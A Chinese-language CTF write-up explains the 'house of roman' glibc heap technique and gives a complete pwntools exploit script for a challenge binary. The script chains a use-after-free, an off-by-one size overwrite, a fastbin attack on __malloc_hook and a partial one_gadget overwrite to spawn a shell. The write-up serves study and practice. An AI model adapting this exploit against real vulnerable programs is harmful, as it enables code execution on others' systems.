[TOC]


# checksec
![image](A2B2187812D14E12A6B69D8C7F7E8185)

# 解题思路


house_of_roman：
 该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用
 
 house_of_roman的作者提供了一个demo作为展示
 利用大概分三个步骤：
1. 将 FD 指向 malloc_hook
2. 修正 0x71 的 Freelist
3. 往 malloc_hook 写入 one gadget

![image](1251AA955F29416581E8BC0102298114)


程序存在UAF漏洞和堆溢出漏洞

![image](133487FEB4314D2D9FCB9CC40709404C)

![image](D9338DDA08A643A7BE63F1101F7D121B)

程序的大致情况了解了后，分析作者的利用过程
 我将作者的利用过程又细分了下
 
 1. 先分配3个chunk(0,1,2),大小分别为0x20,0xd0,0x70
 2. 用write_chunk功能在chunk2 + 0x68上设置fakesize 为0x61，用于后面的fastbins attack
 3. 将chunk1 free 掉后再分配，使得chunk1中包含main_arean+0x88的指针
4. 然后分配3个大小为0x70的chunk(3,4,5),为后面做准备
5. 通过堆溢出漏洞，将chunk1的size字段伪造为0x71，然后将chunk2,chunk3 free掉，通过UAF漏洞，将chunk3的fd指针最低位修改成0x20，将chunk1加入fastbins list中
6. 将chunk1的fd修改成 __malloc_hook-0x23,之所以修改成__malloc_hook-0x23 ，是为了后面的fastbin dup， __malloc_hook - 0x23 + 0x8的地址上的值为0x7f
7. 连续分配3个大小为0x70的chunk，就可以获得包含__malloc_hook的chunk，将这个chunk指针赋给chunk0
8. free掉chunk4,通过uaf，将chunk4的FD修改为0，修复fastbins list
9. 利用unsorted bins attack 向__malloc_hook写入main_arena+0x88(获得偏移)
10. 通过编辑功能，将__malloc_hook的低三个字节修改成one_gadget的偏移
11. 最后连续free chunk5两次，通过malloc_printerr来出发malloc，getshell


# exp
```
from pwn import* 
#context.log_level = 'debug' 
p = process('./new_chall') 
def create(size,idx):
    p.recv()
    p.sendline('1')
    p.recv()
    p.sendline(str(size))
    p.recv()
    p.sendline(str(idx)) 
    
def edit(idx,content):
    p.recv()
    p.sendline('2')
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.send(content) 
    
def delete(idx):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(idx)) 
    
p.recvuntil(":") 
p.sendline("zs0zrc") 

create(0x18,0) 
# chunk0 0x20 
create(0xc8,1) 
# chunk1 d0 0x555555757030  
create(0x65,2) 
# chunk2 0x70 0x555555757100 
fake = "A"*0x68 
fake += p64(0x61) 
## fake size 伪造一个fastbin
edit(1,fake) 
log.info('edit chunk 1 to fake') 
#放入unsorted bin
delete(1)
```
![image](DF07C842A69343DCBC20A31D10444B2D)
```
#从unsorted bin 中取出，且fd存放main_arean+0x88指针
create(0xc8,1) 

create(0x65,3) 
# chunk3 0x555555757170 
create(0x65,15) 
# chunk4 0x5555557571e0 
create(0x65,18) 
# chunk5 0x555555757250 

over = "A"*0x18 
# off by one 
# 在复现的时候，覆盖size = 0x61 发现进行fastbin attack 的时候 ， __malloc_hook 附近无法构造0x61 的chunk 地址都是0x7f 开头 ， 所以使用0x71 最好。
over += "\x71" 
# set chunk 1's size --> 0x71 
edit(0,over) 
log.info('set chunk 1 size --> 0x71') 
delete(2) 
delete(3) 
#修改fastbin fd指针
heap_po = "\x20" 
edit(3,heap_po) 
log.info('ADD b to fastbins list') 
```
![image](9CF73E2008704BECBF0536281F8FCB8D)
```
# malloc_hook-->[0x7ffff7dd1b10] 
malloc_hook_nearly = "\xed\x1a" 
#__malloc_hook - 0x23  fastbin_dup 绕过检测
edit(1,malloc_hook_nearly) 
```
![image](01880447809E4A4BA4C0916F14CBB94F)
```
log.info("change B fd ") 
create(0x65,0) 
create(0x65,0) 
create(0x65,0) 
#连续分配三次大小为0x70的chunk，就可获得包含__malloc_hook的chunk了
```
![image](15BB901DBBB9486F8B4F05111EB0DD21)
```
#malloc a chunk include malloc_hook 
delete(15) 
```
![image](68DE6ECDB4184422A6BE5F7BEB964EEC)
```
#修复fastbin，并设15 为第一个fastbin
edit(15,p64(0))
```
![image](D38ACD34F25648EBA9911857D6D3A66A)
```
#fix fastbins list 
log.info('fix fastbins list') 
create(0xc8,1) 
create(0xc8,1) 
create(0x18,2) 
create(0xc8,3) 
create(0xc8,4) 
delete(1) 
```
![image](5F90B80CF7EC49568451CEDDB9907838)
```
po = "B"*8 
po += "\x00\x1b" 


edit(1,po) 
```
![image](977FDF9295F7441FB357F21907C64F08)
```
# 对分配的unsortedbin 不进行检查吗?
create(0xc8,1) 
log.info('use unsortbins attack change malloc_hook to main_arena + 0x88') 
over = "R"*0x13 
# padding for malloc_hook 
over += "\xa4\xd2\xaf" 
edit(0,over) 
```
![image](89913C792DFE4BA391C6DF6D743AFA2E)
```
delete(18) 
delete(18) 
p.interactive() 
```


Q&A ：
    为什么over+="\xa4\xd2\xaf"覆盖后24bit
    
    
A:  没有开启地址随机化处理 ，相当于使用libc基址
    
![image](D8AA9B669CA544A5BB2D61004E685085) 

![image](020F51D0AA9E4F4BBA6342A849326145)

    libc_base = 0x7ffff7a52390 - 0x45390 = 0x7FFFF7A0D000
    0x7FFFF7A0D000 + 0xf02a4  = 0x7FFFF7AFD2A4‬
    
Q&A : 
    __malloc_hook 函数有什么用？
    用于自定义malloc 行为 , 修改__malloc_hook 在调用malloc时会调用__malloc_hook 指向的函数，但是在这道题 通过malloc 调用one_gadget 的时候会报出错误 ，此处留疑问，日后解决。
    
    
![image](2233A2EBE3B64AF5BF520DC3C44EC6E0)